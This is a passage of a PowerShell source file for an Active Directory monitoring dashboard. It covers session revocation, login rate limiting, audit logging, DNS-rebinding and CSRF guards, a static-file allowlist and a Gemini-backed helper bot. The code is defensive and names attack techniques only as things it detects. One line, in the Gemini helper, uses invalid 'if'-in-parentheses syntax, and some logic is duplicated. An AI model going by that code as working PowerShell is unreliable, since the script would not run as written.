  $null = Update-UsersFingerprint
  $stamp = ''
  if ($Script:UsersUpdated.ContainsKey($UserName)) { $stamp = "$($Script:UsersUpdated[$UserName])" }
  # UserStamp is the account revision this session was opened against, so a later
  # -Reset (which rewrites 'updated') is detectable and ends the session
  $Script:Sessions[$id] = [PSCustomObject]@{ User = $UserName; Created = $now; LastSeen = $now; UserStamp = $stamp }
  return $id
}

# Re-reads the users file only when its mtime moved. Returns $true when the
# fingerprint changed, so the caller knows to re-check the sessions.
function Update-UsersFingerprint {
  try {
    if (-not (Test-Path $UsersFile)) {
      if ($null -ne $Script:UsersStamp) {
        $Script:UsersStamp = $null
        $Script:UsersUpdated = @{}
        return $true
      }
      return $false
    }
    $stamp = "$UsersFile|" + (Get-Item -Path $UsersFile).LastWriteTimeUtc.Ticks
    if ($null -ne $Script:UsersStamp -and $stamp -eq $Script:UsersStamp) { return $false }
    $store = Get-UserStore
    $map = @{}
    if ($store -and $store.users) {
      foreach ($u in @($store.users)) { $map["$($u.user)"] = "$($u.updated)" }
    }
    $Script:UsersStamp = $stamp
    $Script:UsersUpdated = $map
    return $true
  } catch {
    return $false
  }
}

# Ends every session whose account is gone from sentinel-users.json or whose
# record was rewritten (-Reset changes 'updated'). A session with no stamp is
# ended too: it can only predate this check, and fail-closed is the right way to
# be wrong about whether a credential is still valid.
function Revoke-StaleSessions {
  if (-not (Update-UsersFingerprint)) { return 0 }
  $dropped = 0
  foreach ($id in @($Script:Sessions.Keys)) {
    $s = $Script:Sessions[$id]
    $user = "$($s.User)"
    if (-not $Script:UsersUpdated.ContainsKey($user)) {
      $Script:Sessions.Remove($id)
      $dropped++
      continue
    }
    if ("$($s.UserStamp)" -ne "$($Script:UsersUpdated[$user])") {
      $Script:Sessions.Remove($id)
      $dropped++
    }
  }
  if ($dropped -gt 0) {
    $Script:UsersRevoked += $dropped
    Write-Host ("  [auth] " + $dropped + " session(s) ended because the account store changed.") -ForegroundColor DarkYellow
  }
  return $dropped
}

# Returns the session record and refreshes its idle timer, or $null when it is
# unknown, past its 8h absolute lifetime, or idle for more than 30 minutes.
function Get-Session([string]$SessionId) {
  if (-not $SessionId) { return $null }
  # An account edit (New-SentinelAdmin -Remove / -Reset) must take effect on the
  # very next request, not at the next restart.
  $null = Revoke-StaleSessions
  if (-not $Script:Sessions.ContainsKey($SessionId)) { return $null }
  $s = $Script:Sessions[$SessionId]
  $now = Get-Date
  if (($now - $s.Created).TotalHours -ge $Script:SessionHours) {
    $Script:Sessions.Remove($SessionId)
    return $null
  }
  if (($now - $s.LastSeen).TotalMinutes -ge $Script:IdleMinutes) {
    $Script:Sessions.Remove($SessionId)
    return $null
  }
  $s.LastSeen = $now
  return $s
}

function Remove-Session([string]$SessionId) {
  if ($SessionId -and $Script:Sessions.ContainsKey($SessionId)) { $Script:Sessions.Remove($SessionId) }
}

function Remove-ExpiredSessions {
  foreach ($id in @($Script:Sessions.Keys)) { $null = Get-Session $id }
}

function Get-SessionIdFromContext($ctx) {
  if (-not $ctx) { return '' }
  try {
    $c = $ctx.Request.Cookies['sentinel_session']
    if ($c -and $c.Value) { return "$($c.Value)" }
  } catch { }
  return ''
}

function Get-SessionUser($ctx) {
  $s = Get-Session (Get-SessionIdFromContext $ctx)
  if (-not $s) { return '' }
  return "$($s.User)"
}

function Get-ClientAddress($ctx) {
  try {
    if ($ctx -and $ctx.Request -and $ctx.Request.RemoteEndPoint) { return "$($ctx.Request.RemoteEndPoint.Address)" }
  } catch { }
  return 'unknown'
}

# ---- login brute-force protection -----------------------------------------
function Test-LoginAllowed([string]$Ip) {
  if (-not $Script:LoginFailures.ContainsKey($Ip)) { return $true }
  $rec = $Script:LoginFailures[$Ip]
  if ($rec.BlockedUntil -and (Get-Date) -lt $rec.BlockedUntil) { return $false }
  return $true
}

function Get-LoginRetryAfter([string]$Ip) {
  if (-not $Script:LoginFailures.ContainsKey($Ip)) { return 0 }
  $rec = $Script:LoginFailures[$Ip]
  if (-not $rec.BlockedUntil) { return 0 }
  $left = [int][Math]::Ceiling(($rec.BlockedUntil - (Get-Date)).TotalSeconds)
  if ($left -lt 0) { return 0 }
  return $left
}

function Register-LoginFailure([string]$Ip) {
  $now = Get-Date
  $rec = $null
  if ($Script:LoginFailures.ContainsKey($Ip)) { $rec = $Script:LoginFailures[$Ip] }
  if (-not $rec -or ($now - $rec.First).TotalMinutes -ge $Script:LoginWindowMinutes) {
    $rec = [PSCustomObject]@{ Count = 0; First = $now; BlockedUntil = $null }
    $Script:LoginFailures[$Ip] = $rec
  }
  $rec.Count = $rec.Count + 1
  if ($rec.Count -ge $Script:MaxLoginFailures) {
    $rec.BlockedUntil = $now.AddMinutes($Script:LoginBlockMinutes)
  }
  return $rec
}

# A stalled body is not a slow client, it is an attempt to freeze a
# single-threaded server: $Script:MaxBodyStalls of them from one address and that
# address is blocked for the same window a password sweep would earn it. The
# stall is ALSO registered as a login failure, so it counts toward the 5-failure
# rate limit as well.
function Register-BodyStall([string]$Ip) {
  if (-not $Ip) { return 0 }
  $n = 0
  if ($Script:BodyStalls.ContainsKey($Ip)) { $n = [int]$Script:BodyStalls[$Ip] }
  $n++
  $Script:BodyStalls[$Ip] = $n
  if ($n -ge $Script:MaxBodyStalls) {
    $now = Get-Date
    if (-not $Script:LoginFailures.ContainsKey($Ip)) {
      $Script:LoginFailures[$Ip] = [PSCustomObject]@{ Count = 0; First = $now; BlockedUntil = $null }
    }
    $rec = $Script:LoginFailures[$Ip]
    $rec.BlockedUntil = $now.AddMinutes($Script:LoginBlockMinutes)
    if ([int]$rec.Count -lt $Script:MaxLoginFailures) { $rec.Count = $Script:MaxLoginFailures }
  }
  return $n
}

function Reset-LoginFailures([string]$Ip) {
  if ($Script:LoginFailures.ContainsKey($Ip)) { $Script:LoginFailures.Remove($Ip) }
}

# ---- auth audit trail -----------------------------------------------------
# Every attempt is recorded - source IP, username, outcome, never a password -
# in sentinel-auth.csv, so a login sweep is visible even when the alert feed is
# quiet. Same formula-injection guard as the alert export.
function Write-AuthEvent([string]$Ip, [string]$UserName, [string]$Outcome, [string]$Reason) {
  try {
    $row = [PSCustomObject]@{
      Time     = (Get-Date).ToUniversalTime().ToString("o")
      SourceIp = Protect-CsvCell $Ip
      User     = Protect-CsvCell $UserName
      Outcome  = $Outcome
      Reason   = Protect-CsvCell $Reason
    }
    if (Test-Path $AuthFile) {
      $row | Export-Csv -Path $AuthFile -NoTypeInformation -Force -Encoding UTF8 -Append
    } else {
      $row | Export-Csv -Path $AuthFile -NoTypeInformation -Force -Encoding UTF8
    }
  } catch { }
}

# The last audit-policy change for /api/settings (read-only; subcategory,
# before, after, backup path - never a credential).
function Get-LastAuditChange {
  try {
    if (-not (Test-Path $AuditFile)) { return $null }
    $rows = @(Import-Csv -Path $AuditFile | Select-Object -Last 1)
    if ($rows.Count -eq 0) { return $null }
    return [PSCustomObject]@{
      at      = "$($rows[0].Time)"
      subcategory = "$($rows[0].Subcategory)"
      before  = "$($rows[0].Before)"
      after   = "$($rows[0].After)"
      backup  = "$($rows[0].Backup)"
    }
  } catch { return $null }
}

# ---- audit-policy change log (one row per subcategory changed) -------------
function Write-AuditChange([string]$Subcategory, [string]$Before, [string]$After, [string]$BackupPath) {
  try {
    $row = [PSCustomObject]@{
      Time        = (Get-Date).ToUniversalTime().ToString("o")
      Subcategory = Protect-CsvCell $Subcategory
      Before      = Protect-CsvCell $Before
      After       = Protect-CsvCell $After
      Backup      = Protect-CsvCell $BackupPath
    }
    if (Test-Path $AuditFile) {
      $row | Export-Csv -Path $AuditFile -NoTypeInformation -Force -Encoding UTF8 -Append
    } else {
      $row | Export-Csv -Path $AuditFile -NoTypeInformation -Force -Encoding UTF8
    }
  } catch { }
}

# ---- Host header guard (DNS rebinding) ------------------------------------
# A browser sends whatever Host the page asked for, so a page on the internet can
# point a name it controls at 127.0.0.1 and reach a loopback-bound dashboard.
# When the bind is loopback, only loopback names are accepted.
function Test-HostAllowed($ctx) {
  if ($Bind -and $Bind -ne 'localhost' -and $Bind -ne '127.0.0.1' -and $Bind -ne '::1') { return $true }
  try {
    $hostHeader = "$($ctx.Request.Headers['Host'])"
    if (-not $hostHeader) { return ($false) }   # guard the guard: no Host at all is refused
    $name = $hostHeader
    if ($name.StartsWith('[')) {
      $end = $name.IndexOf(']')
      if ($end -gt 0) { $name = $name.Substring(0, $end + 1) }
    } elseif ($name.Contains(':')) {
      $name = $name.Substring(0, $name.IndexOf(':'))
    }
    $name = $name.ToLower()
    return ($name -eq 'localhost' -or $name -eq '127.0.0.1' -or $name -eq '[::1]' -or $name -eq '::1')
  } catch { return $false }
}

# ---- BOT HELPER FUNCTIONS ----
# Rule-based bot answer (extracted from existing logic for reuse with Gemini fallback)
function Get-RuleBasedBotAnswer([string]$Question) {
    $alerts = $Script:Alerts
    $rules = @(Get-RuleCatalog)

    $answer = ''
    $activeCount = @($alerts | Where-Object { -not $_.SelfTest -and ($_.Status -eq 'New' -or $_.Status -eq 'Investigating' -or -not $_.Status) }).Count
    $criticalCount = @($alerts | Where-Object { -not $_.SelfTest -and $_.Severity -eq 'Critical' }).Count
    $highCount = @($alerts | Where-Object { -not $_.SelfTest -and $_.Severity -eq 'High' }).Count

    # Question keywords
    $q = $Question.ToLower()
    if ($q -match 'critical|high|medium|low') {
        $answer += "Active alerts: $activeCount total ($criticalCount critical, $highCount high).`n"
    }
    if ($q -match 'rules|family|blind|unverified') {
        $ruleCount = $rules.Count
        $blindCount = @($rules | Where-Object { $_.auditState -eq 'blind' }).Count
        $unknownCount = @($rules | Where-Object { $_.auditState -eq 'unknown' }).Count
        $answer += "Detection coverage: $ruleCount families ($blindCount blind, $unknownCount unverified)`n"
    }
    if ($q -match 'chain|attack path') {
        $answer += "Attack chains are built from alerts sharing an account or source IP within a 60-minute window.`n"
    }
    if ($q -match 'kerberoast|as-rep|dcsync') {
        $answer += "Key AD attack rules: Kerberoasting (Medium/High), AS-REP Roasting (High/Critical), DCSync (Critical). All require specific audit policy subcategories to be enabled.`n"
    }
    if ($q -match 'login|brute|spray') {
        $answer += "Credential detection: password spraying, brute-force single account, NTLM auth failures, kerberos preauth spraying. All deduplicated per entity.`n"
    }
    if ($q -match 'persistence|registry|scheduled') {
        $answer += "Persistence detection: scheduled tasks, registry Run keys, service creation/modification.`n"
    }
    if ($q -match 'evasion|log|audit|defender|firewall') {
        $answer += "Defense evasion: log tampering, audit policy changes, event log service stops, Defender disabled, firewall profile disabled.`n"
    }
    if ($q -match 'account|create|delete|enable|disable') {
        $answer += "Account monitoring: creation, deletion, enable/disable, group membership changes, password resets by admin.`n"
    }
    if ($answer -eq '') {
        $answer = "I'm Wolf, your AD sentinel assistant. I can tell you about active alerts, detection coverage, rule status, and attack chains. Try asking: 'how many critical alerts?', 'what's blind?', 'show attack chains', or 'what is kerberoasting?'"
    }
    return $answer
}

# Gemini AI bot answer (enhances rule-based answer with AI when key is configured)
function Get-GeminiBotAnswer([string]$Question) {
    $alerts = $Script:Alerts
    $rules = @(Get-RuleCatalog)
    $chains = @(Get-AttackChains)

    # Build compact JSON summary of current state
    $activeAlerts = @($alerts | Where-Object { -not $_.SelfTest -and ($_.Status -eq 'New' -or $_.Status -eq 'Investigating' -or -not $_.Status) })
    $severityCounts = @{}
    foreach ($a in $activeAlerts) {
        $sev = "$($a.Severity)"
        if (-not $severityCounts.ContainsKey($sev)) { $severityCounts[$sev] = 0 }
        $severityCounts[$sev]++
    }
    $recentAlerts = @($activeAlerts | Sort-Object { [DateTime]$_.Time } -Descending | Select-Object -First 5 | ForEach-Object {
        @{
            title = $_.Title
            severity = $_.Severity
            host = $_.Host
            account = $_.Account
            time = $_.Time
        }
    })

    $ruleCount = $rules.Count
    $blindCount = @($rules | Where-Object { $_.auditState -eq 'blind' }).Count
    $unknownCount = @($rules | Where-Object { $_.auditState -eq 'unknown' }).Count
    $coverage = if ($ruleCount -gt 0) { [int][Math]::Round((100.0 * ($ruleCount - $blindCount - $unknownCount)) / $ruleCount) } else { 0 }

    $stateSummary = @{
        alertCounts = $severityCounts
        recentAlerts = $recentAlerts
        ruleCoverage = @{
            total = $ruleCount
            blind = $blindCount
            unverified = $unknownCount
            percent = $coverage
        }
        chainCount = $chains.Count
    }

    $geminiKeyFile = if ($PSScriptRoot) { Join-Path $PSScriptRoot "sentinel-gemini.key" } else { "sentinel-gemini.key" }
    $geminiKey = Get-Content -Raw (if ($PSScriptRoot) { Join-Path $PSScriptRoot "sentinel-gemini.key" } else { "sentinel-gemini.key" }) -ErrorAction SilentlyContinue
    if (-not $geminiKey) { return $null }

    $prompt = @"
You are Wolf, the Alpha Sentinel AI assistant for Active Directory security monitoring.
You answer questions about this dashboard's alerts, detection coverage, rules, and attack chains.
Use ONLY the data provided below. Do not invent AD facts not present in this data.
If you cannot answer from the data, say you don't know.

CURRENT STATE:
$($stateSummary | ConvertTo-Json -Depth 5)

USER QUESTION: $Question

Answer concisely as Wolf, the AD security assistant. Focus on actionable insights from the data.
"@

    try {
        $body = @{
            contents = @(
                @{
                    parts = @(
                        @{ text = $prompt }
                    )
                }
            )
            generationConfig = @{
                temperature = 0.3
                maxOutputTokens = 500
            }
        }
        $json = $body | ConvertTo-Json -Depth 10
        $url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=$geminiKey"
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $json -ContentType "application/json" -TimeoutSec 8
        if ($response.candidates -and $response.candidates[0].content.parts[0].text) {
            return $response.candidates[0].content.parts[0].text.Trim()
        }
    } catch {
        # Log failure server-side only
        Write-Host "  [bot] Gemini API error: $($_.Exception.Message)" -ForegroundColor DarkYellow
    }
    return $null
}

# ============================================================================
# EMBEDDED WEB SERVER (dashboard + JSON API) - HttpListener, no deps
# ============================================================================
$Script:DashboardDir = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }

function Send-Bytes($res, $bytes, $contentType, $status = 200) {
  $res.StatusCode = $status
  $res.ContentType = $contentType
  # the dashboard shows live attack data - keep it out of any shared cache and
  # stop the browser treating a JSON body as HTML
  try { $res.Headers['X-Content-Type-Options'] = 'nosniff' } catch { }
  try { $res.Headers['Cache-Control'] = 'no-store' } catch { }
  try { $res.Headers['X-Frame-Options'] = 'DENY' } catch { }
  try { $res.Headers['Referrer-Policy'] = 'no-referrer' } catch { }
  $res.ContentLength64 = $bytes.Length
  $res.OutputStream.Write($bytes, 0, $bytes.Length)
}
function Send-Json($res, $json, $status = 200) {
  Send-Bytes $res ([Text.Encoding]::UTF8.GetBytes($json)) 'application/json; charset=utf-8' $status
}

# True when the request presents a live session cookie. The token header and
# ?token= are gone: they were readable by anyone who could fetch the page.
function Test-Authenticated($ctx) {
  return ($null -ne (Get-Session (Get-SessionIdFromContext $ctx)))
}

# CSRF guard for state-changing calls: a browser sends Origin (or Referer) on a
# cross-site POST, so refuse one that did not come from this dashboard's host.
# Non-browser clients send neither and are allowed through (they already had to
# present the token).
function Test-SameOrigin($ctx) {
  $origin = "$($ctx.Request.Headers['Origin'])"
  if (-not $origin) { $origin = "$($ctx.Request.Headers['Referer'])" }
  if (-not $origin) { return $true }
  try {
    $oh = ([uri]$origin).Host.ToLower()
    $rh = "$($ctx.Request.Url.Host)".ToLower()
    if ($oh -eq $rh) { return $true }
    # localhost / 127.0.0.1 / ::1 are the same site as far as the dashboard is
    # concerned (a browser may address it either way). NOTE: this must compare
    # BOTH sides - an earlier version accepted any request whose own host was
    # "localhost", which is every request on the default bind, so the check did
    # nothing at all.
    $loopback = @('localhost', '127.0.0.1', '::1')
    if (($loopback -contains $oh) -and ($loopback -contains $rh)) { return $true }
    return $false
  } catch { return $false }
}
function Send-File($res, $path, $contentType) {
  # fail LOUDLY (500 + clear message) instead of silently returning an empty
  # 200 when dashboard.html/dashboard.js is missing (e.g. iex-invoked run or
  # only the .ps1 was copied)
  if (-not (Test-Path $path)) {
    $name = [IO.Path]::GetFileName($path)
    Send-Json $res ('{"error":"' + $name + ' not found next to AlphaSentinel.ps1 - download the full release (dashboard.html + dashboard.js must sit beside the script)."}') 500
    return
  }
  $body = Get-Content -Raw $path
  if ($contentType -like 'text/html*') {
    # script-src stays 'self': nothing is injected into the page any more (the
    # old build spliced the API token in here, which made that token readable by
    # anyone who could fetch the page). Scripts ship as separate files:
    # /dashboard.js and /login.js.
    $csp = 'default-src ''self''; img-src ''self'' data:; style-src ''self'' ''unsafe-inline''; script-src ''self''; connect-src ''self''; form-action ''self''; frame-ancestors ''none''; base-uri ''none'''
    try { $res.Headers['Content-Security-Policy'] = $csp } catch { }
  }
  Send-Bytes $res ([Text.Encoding]::UTF8.GetBytes($body)) $contentType
}

# ---- static files: an EXACT allowlist -------------------------------------
# Every servable file is named here with its type. The request never becomes a
# filesystem path, so there is nothing to traverse: a path that is not a key of
# this table is a 404, and ../ can only ever produce one of those.
$Script:StaticFiles = @{
  '/dashboard.html' = @{ file = 'dashboard.html'; type = 'text/html; charset=utf-8' }
  '/login.html'     = @{ file = 'login.html';     type = 'text/html; charset=utf-8' }
  '/login.js'       = @{ file = 'login.js';       type = 'application/javascript; charset=utf-8' }
  '/css/tokens.css'     = @{ file = 'css/tokens.css';     type = 'text/css; charset=utf-8' }
  '/css/base.css'       = @{ file = 'css/base.css';       type = 'text/css; charset=utf-8' }
  '/css/layout.css'     = @{ file = 'css/layout.css';     type = 'text/css; charset=utf-8' }
  '/css/components.css' = @{ file = 'css/components.css'; type = 'text/css; charset=utf-8' }
  '/css/pages.css'      = @{ file = 'css/pages.css';      type = 'text/css; charset=utf-8' }
  '/css/login.css'      = @{ file = 'css/login.css';      type = 'text/css; charset=utf-8' }
  '/js/api.js'      = @{ file = 'js/api.js';      type = 'application/javascript; charset=utf-8' }
  '/js/state.js'    = @{ file = 'js/state.js';    type = 'application/javascript; charset=utf-8' }
  '/js/ui.js'       = @{ file = 'js/ui.js';       type = 'application/javascript; charset=utf-8' }
  '/js/router.js'   = @{ file = 'js/router.js';   type = 'application/javascript; charset=utf-8' }
  '/js/app.js'      = @{ file = 'js/app.js';      type = 'application/javascript; charset=utf-8' }
  '/js/pages/overview.js' = @{ file = 'js/pages/overview.js'; type = 'application/javascript; charset=utf-8' }
  '/js/pages/alerts.js'   = @{ file = 'js/pages/alerts.js';   type = 'application/javascript; charset=utf-8' }
  '/js/pages/rules.js'    = @{ file = 'js/pages/rules.js';    type = 'application/javascript; charset=utf-8' }
  '/js/pages/events.js'   = @{ file = 'js/pages/events.js';   type = 'application/javascript; charset=utf-8' }
  '/js/pages/settings.js' = @{ file = 'js/pages/settings.js'; type = 'application/javascript; charset=utf-8' }
  '/js/pages/settings-general.js' = @{ file = 'js/pages/settings-general.js'; type = 'application/javascript; charset=utf-8' }
  '/js/pages/settings-account.js' = @{ file = 'js/pages/settings-account.js'; type = 'application/javascript; charset=utf-8' }
  '/js/pages/settings-users.js'   = @{ file = 'js/pages/settings-users.js';   type = 'application/javascript; charset=utf-8' }
  '/js/pages/settings-audit.js'   = @{ file = 'js/pages/settings-audit.js';   type = 'application/javascript; charset=utf-8' }
  '/js/pages/chains.js'   = @{ file = 'js/pages/chains.js';   type = 'application/javascript; charset=utf-8' }
  '/js/pages/assets.js'   = @{ file = 'js/pages/assets.js';   type = 'application/javascript; charset=utf-8' }
  '/js/pages/paths.js'    = @{ file = 'js/pages/paths.js';    type = 'application/javascript; charset=utf-8' }
  '/js/pages/reports.js'  = @{ file = 'js/pages/reports.js'; type = 'application/javascript; charset=utf-8' }
   '/js/pages/bot.js'     = @{ file = 'js/pages/bot.js'; type = 'application/javascript; charset=utf-8' }
  '/css/print.css'        = @{ file = 'css/print.css';        type = 'text/css; charset=utf-8' }
}


function Start-WebServer {
  $listener = New-Object System.Net.HttpListener
  # LOCALHOST BY DEFAULT (see the -Bind param). "http://+:8443/" binds every
  # interface; that is opt-in now, not the default.
  $prefixHost = "$Bind"
  if (-not $prefixHost -or $prefixHost -eq 'localhost' -or $prefixHost -eq '127.0.0.1') {
    $prefixHost = 'localhost'
  } elseif ($prefixHost -eq '0.0.0.0' -or $prefixHost -eq '*' -or $prefixHost -eq '+') {
    $prefixHost = '+'
  }
  $prefix = "http://" + $prefixHost + ":$Port/"
  $listener.Prefixes.Add($prefix)
  # Web DoS bounds. The defaults are two minutes, which on a SINGLE-THREADED
  # server means one stalled client can hold the only thread: EntityBody caps how
  # long a client may take to send a request body, DrainEntityBody caps how long
  # we wait to finish draining one we did not read, and HeaderWait bounds a client
  # that opens a connection and never finishes its headers (slowloris).
  try {
    $listener.TimeoutManager.EntityBody = [timespan]::FromSeconds(5)
    $listener.TimeoutManager.DrainEntityBody = [timespan]::FromSeconds(5)
    $listener.TimeoutManager.HeaderWait = [timespan]::FromSeconds(10)
  } catch { }
  try {
    $listener.Start()
  } catch {
    Write-Host ("  [web] could not bind " + $prefix + " - " + $_.Exception.Message) -ForegroundColor Red
    if ($prefixHost -eq '+') {
      Write-Host "  [web] binding all interfaces needs an elevated prompt, or use an explicit URL ACL:" -ForegroundColor Yellow
      Write-Host ("  [web]   netsh http add urlacl url=" + $prefix + " user=Everyone") -ForegroundColor Yellow
    }
    throw
  }
  Write-Host ("  [web] dashboard listening on " + $prefix) -ForegroundColor Green
  if ($prefixHost -eq '+') {
    Write-Host "  [web] WARNING: bound to every interface. Any host on the network can reach the login page;" -ForegroundColor Yellow
    Write-Host "  [web]          they need an account in sentinel-users.json to get any further." -ForegroundColor Yellow
  }
  return $listener
}


# Handle a single HTTP request context. Called from the MAIN thread loop -
# single-threaded by design: PowerShell scriptblocks cannot run on .NET
# ThreadPool threads without a runspace, so the earlier Task.Run web thread
# died silently. One loop drains web requests AND polls the event log
# (works on PS 5.1 / Windows Server 2012).
# Handle a single HTTP request context. Called from the MAIN thread loop -
# single-threaded by design: PowerShell scriptblocks cannot run on .NET
# ThreadPool threads without a runspace, so the earlier Task.Run web thread
# died silently. One loop drains web requests AND polls the event log
# (works on PS 5.1 / Windows Server 2012).
#
# Routing:
#   /                        -> login.html when there is no session, else dashboard.html
#   /login.html /login.js    -> the sign-in page (public)
#   POST /api/login          -> verify + create a session, set the cookie (public)
#   GET  /api/health         -> open, deliberately carries no alert content
#   everything else /api/*   -> 401 JSON without a live session
#   ack / unack / status / self-test / preflight-refresh / logout
#                            -> POST only, same origin, and session required
function Invoke-Handler($ctx) {
  $path = $ctx.Request.Url.AbsolutePath
  $method = "$($ctx.Request.HttpMethod)"
  $res = $ctx.Response
  # per-request flag: whether THIS request's body was abandoned mid-read
  $Script:BodyTimedOut = $false
  # The client address is captured BEFORE anything can abort the connection:
  # aborting a stalled body makes RemoteEndPoint unavailable, so reading it
  # afterwards filed the attack under "unknown" and left the real source
  # unblocked and unlogged.
  $clientIp = Get-ClientAddress $ctx
  $Script:ReportUser = ''
  if (Test-Authenticated $ctx) { $Script:ReportUser = Get-SessionUser $ctx }
  try {
    # ---- DNS-rebinding guard: on a loopback bind only loopback Host names
    $allowed = Test-HostAllowed $ctx
    if (-not $allowed) {
      Send-Json $res '{"error":"Host header not allowed on this listener."}' 421
      return
    }

    # ---- session gate. /api/login and /api/health are the only public API
    # ---- routes; /api/health returns counters only, never alert content.
    $isApi = $path.StartsWith('/api/')
    $isPublic = (($path -eq '/api/login') -or ($path -eq '/api/health'))
    if ($isApi -and -not $isPublic) {
      if (-not (Test-Authenticated $ctx)) {
        Send-Json $res '{"error":"Not signed in."}' 401
        return
      }
    }

    # ---- request body guard, BEFORE anything is read. A POST must declare a
    # ---- Content-Length and it must fit the endpoint's budget; a chunked or
    # ---- length-less body is refused with 411 because its size is only
    # ---- knowable by reading it, which is the DoS this prevents.
    # ---- the body is read ONCE here, so the 411/413 decision and the stalled
    # ---- client watchdog happen in one place for every POST route. Routes use
    # ---- $bodyParsed instead of reading again (which would also re-drain).
    $bodyParsed = $null
    if ($isApi -and $method -eq 'POST') {
      $bodyLimit = $Script:MaxJsonBodyBytes
      if ($path -eq '/api/login') { $bodyLimit = $Script:MaxLoginBodyBytes }
      $bodyReject = Test-BodyAllowed $ctx $bodyLimit
      if ($bodyReject) {
        $Script:BodyRejections++
        Send-Json $res ('{"error":"' + $bodyReject.Message + '"}') $bodyReject.Status
        return
      }
      $bodyParsed = Read-JsonBody $ctx $bodyLimit
      if ($Script:BodyTimedOut) {
        # Read-JsonBody already counted the timeout and aborted the connection.
        $stallIp = $clientIp
        $stalls = Register-BodyStall $stallIp
        if ($path -eq '/api/login') {
          [void](Register-LoginFailure $stallIp)
          Write-AuthEvent $stallIp '' 'failure' 'request body stalled - connection aborted'
        } else {
          $stallUser = ''
          if (Test-Authenticated $ctx) { $stallUser = Get-SessionUser $ctx }
          Write-AuthEvent $stallIp $stallUser 'failure' 'request body stalled - connection aborted'
        }
        if ($stalls -ge $Script:MaxBodyStalls) {
          Write-AuthEvent $stallIp '' 'blocked' ("body stalls from this address reached " + $stalls)
        }
        # the socket is being aborted: there is nothing left to answer on
        return
      }
    }

    # ---- state-changing routes are POST-only and same-origin
    if ($path -match '^/api/alerts/\d+/(ack|unack|status)$' -or $path -eq '/api/self-test' -or $path -eq '/api/preflight/refresh' -or $path -eq '/api/logout' -or
        $path -match '^/api/account/(password|username|avatar)$' -or ($path -eq '/api/users' -and $method -eq 'POST') -or
        $path -match '^/api/users/[^/]+/(reset|remove)$' -or $path -match '^/api/audit/(apply|restore)$') {
      if ($method -ne 'POST') {
        Send-Json $res '{"error":"Method not allowed - this endpoint changes state, so it accepts POST only."}' 405
        return
      }
      if (-not (Test-SameOrigin $ctx)) {
        Send-Json $res '{"error":"Cross-origin request refused."}' 403
        return
      }
    }

    # ---- static assets, served from the allowlist above. Anything else that is
    # ---- not an /api/ route is a 404: no directory listing, no traversal, no
    # ---- path guessed from the request.
    if (-not $isApi -and $path -ne '/') {
      $asset = $null
      if ($Script:StaticFiles.ContainsKey($path)) { $asset = $Script:StaticFiles[$path] }
      if ($asset) {
        Send-File $res (Join-Path $Script:DashboardDir $asset.file) $asset.type
      } else {
        Send-Json $res '{"error":"Not found."}' 404
      }
      return
    }

    switch -Regex ($path) {
      '^/$' {
        if (Test-Authenticated $ctx) {
          Send-File $res (Join-Path $Script:DashboardDir 'dashboard.html') 'text/html; charset=utf-8'
        } else {
          Send-File $res (Join-Path $Script:DashboardDir 'login.html') 'text/html; charset=utf-8'
        }
      }
      '^/api/login$' {
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - sign in with POST."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }

        $ip = $clientIp
        # brute-force gate: 5 failures per IP per 5 minutes, then 429 for 5 min
        if (-not (Test-LoginAllowed $ip)) {
          $retry = Get-LoginRetryAfter $ip
          try { $res.Headers.Add('Retry-After', "$retry") } catch { }
          Write-AuthEvent $ip '' 'blocked' "rate limited, $retry s remaining"
          Send-Json $res '{"error":"Too many failed sign-in attempts from this address. Try again in a few minutes."}' 429
          return
        }

        $body = $bodyParsed   # read once, above
        $userName = ''
        $password = ''
        if ($body) {
          if ($null -ne $body.username) { $userName = "$($body.username)" }
          if ($null -ne $body.password) { $password = "$($body.password)" }
        }
        # the SAME message for an unknown user and a wrong password
        $generic = '{"error":"Incorrect username or password."}'
        if (-not $userName -or -not $password) {
          [void](Register-LoginFailure $ip)
          Write-AuthEvent $ip $userName 'failure' 'missing username or password'
          Send-Json $res $generic 401
          return
        }
        if (-not (Test-UserPassword $userName $password)) {
          $rec = Register-LoginFailure $ip
          Write-AuthEvent $ip $userName 'failure' "invalid credentials (failure $($rec.Count) in window)"
          Send-Json $res $generic 401
          return
        }

        Reset-LoginFailures $ip
        $sid = New-Session $userName
        Write-AuthEvent $ip $userName 'success' 'session created'
        $res.Headers.Add('Set-Cookie', "sentinel_session=$sid; Path=/; HttpOnly; SameSite=Strict")
        Send-Json $res (@{ ok = $true; user = $userName; sessionHours = $Script:SessionHours; idleMinutes = $Script:IdleMinutes } | ConvertTo-Json)
      }
            '^/api/bot/ask$' {
                          # The bot accepts POST JSON {question: "..."} from the floating panel.
                          # It requires a live session (same-origin gate).
                          if ($method -ne 'POST') { Send-Json $res '{"error":"POST only."}' 405; return }
                          if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin refused."}' 403; return }
                          $body = $bodyParsed
                          if (-not $body -or -not $body.question) { Send-Json $res '{"error":"Missing question."}' 400; return }
                          $ip = $clientIp
                          # brute-force gate per IP
                          if (-not (Test-LoginAllowed $ip)) {
                            $retry = Get-LoginRetryAfter $ip
                            try { $res.Headers.Add('Retry-After', "$retry") } catch { }
                            Write-AuthEvent $ip '' 'blocked' "rate limited, $retry s remaining"
                            Send-Json $res '{"error":"Too many attempts from this address. Try again in a few minutes."}' 429
                            return
                          }
                          # Get the rule-based answer (existing logic)
                          $answer = Get-RuleBasedBotAnswer $body.question
                          # If Gemini key is configured, try to enhance with AI
                          $geminiKeyFile = if ($PSScriptRoot) { Join-Path $PSScriptRoot "sentinel-gemini.key" } else { "sentinel-gemini.key" }
                          if (Test-Path $geminiKeyFile) {
                            try {
                              $geminiKey = Get-Content -Raw $geminiKeyFile -ErrorAction Stop
                              if ($geminiKey) {
                                $enhanced = Get-GeminiBotAnswer $body.question
                                if ($enhanced) { $answer = $enhanced }
                              }
                            } catch {
                              # Log failure server-side only, fall back to rule-based answer
                              Write-Host "  [bot] Gemini API error: $($_.Exception.Message)" -ForegroundColor DarkYellow
                            }
                          }
                          Send-Json $res (@{ ok = $true; answer = $answer } | ConvertTo-Json)
                        }
      '^/api/logout$' {
        $sid = Get-SessionIdFromContext $ctx
        $who = Get-SessionUser $ctx
        Remove-Session $sid
